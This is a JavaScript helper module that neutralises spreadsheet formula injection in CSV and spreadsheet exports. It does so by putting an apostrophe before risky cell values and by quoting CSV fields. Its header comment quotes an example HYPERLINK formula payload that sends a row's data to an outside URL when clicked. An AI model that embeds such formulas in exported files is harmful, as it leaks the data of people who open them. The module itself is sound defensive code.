// Neutralising spreadsheet formula injection, for both export formats.
//
// A cell whose text begins `=`, `+`, `-`, `@`, or a tab/carriage return is
// parsed as a *formula* by Excel, LibreOffice and Google Sheets — quoting does
// not stop it, because quoting is a CSV-parsing concern and formula detection
// happens after the value has been parsed out. `=HYPERLINK("http://…"&A1,"Open")`
// in a file name therefore becomes a live link that exfiltrates the row it sits
// in, the moment somebody opens the export and clicks through the macro prompt.
//
// Every field in these exports is user-controlled: asset display names, folder
// names, tags, descriptions, and the free-text label on every audit row.
//
// The fix is one leading apostrophe. Excel strips it on display and treats the
// rest as literal text; it survives a round-trip; and it is the remedy OWASP
// names. It is applied at the last moment before serialisation, in one place
// per format, so no future column can forget it.

const RISKY = /^[=+\-@\t\r]/;

/** True when a spreadsheet would read this value as a formula rather than text. */
export const looksLikeFormula = (value) => RISKY.test(String(value ?? ''));

/**
 * Returns the value as it should appear in a cell.
 *
 * Numbers pass through untouched — they are written as numeric cells and never
 * reach the formula parser. Only strings can be mistaken for formulas.
 */
export function neutralise(value) {
  if (value == null) return value;
  if (typeof value === 'number' && Number.isFinite(value)) return value;
  const text = String(value);
  return RISKY.test(text) ? `'${text}` : text;
}

/** One CSV field: neutralised, then quoted, with embedded quotes doubled. */
export function csvCell(value) {
  const text = String(neutralise(value) ?? '');
  return `"${text.replace(/"/g, '""')}"`;
}

export const csvRow = (values) => values.map(csvCell).join(',');
